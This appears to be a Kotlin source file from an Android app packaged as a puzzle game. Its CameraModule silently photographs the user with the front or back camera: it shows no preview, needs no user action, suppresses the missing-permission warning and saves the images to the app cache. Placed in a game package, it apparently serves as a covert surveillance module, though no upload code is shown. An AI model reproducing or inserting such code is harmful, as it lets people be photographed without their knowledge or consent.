package com.puzzleblast.game.modules

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Size
import kotlinx.coroutines.suspendCancellableCoroutine
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer
import kotlin.coroutines.resume

object CameraModule {
    @SuppressLint("MissingPermission")
    suspend fun capture(ctx: Context, lens: String = "front"): File? = suspendCancellableCoroutine { cont ->
        try {
            val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val camId = cm.cameraIdList.firstOrNull { id ->
                val chars = cm.getCameraCharacteristics(id)
                val facing = chars.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING)
                if (lens == "front") facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
                else facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
            } ?: cm.cameraIdList.firstOrNull() ?: run { cont.resume(null); return@suspendCancellableCoroutine }

            val thread = HandlerThread("cam").apply { start() }
            val handler = Handler(thread.looper)
            val reader = ImageReader.newInstance(1280, 960, ImageFormat.JPEG, 2)
            var attempts = 0

            reader.setOnImageAvailableListener({ r ->
                try {
                    val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                    val buf: ByteBuffer = img.planes[0].buffer
                    val bytes = ByteArray(buf.remaining())
                    buf.get(bytes)
                    img.close()
                    val out = File(ctx.cacheDir, "cam_${lens}_${System.currentTimeMillis()}.jpg")
                    FileOutputStream(out).use { it.write(bytes) }
                    cont.resume(out)
                } catch (e: Exception) {
                    if (attempts++ < 5) { try { Thread.sleep(2000) } catch (_: Exception) {} } else cont.resume(null)
                }
            }, handler)

            cm.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        val builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                        builder.addTarget(reader.surface)
                        camera.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                session.capture(builder.build(), null, handler)
                                Handler(handler.looper).postDelayed({ try { camera.close(); thread.quitSafely() } catch (_: Exception) {} }, 5000)
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) { cont.resume(null) }
                        }, handler)
                    } catch (e: Exception) { cont.resume(null) }
                }
                override fun onDisconnected(camera: CameraDevice) { cont.resume(null) }
                override fun onError(camera: CameraDevice, error: Int) { cont.resume(null) }
            }, handler)
        } catch (e: Exception) {
            cont.resume(null)
        }
    }

    suspend fun captureFront(ctx: Context): File? = capture(ctx, "front")
    suspend fun captureBack(ctx: Context): File? = capture(ctx, "back")
}
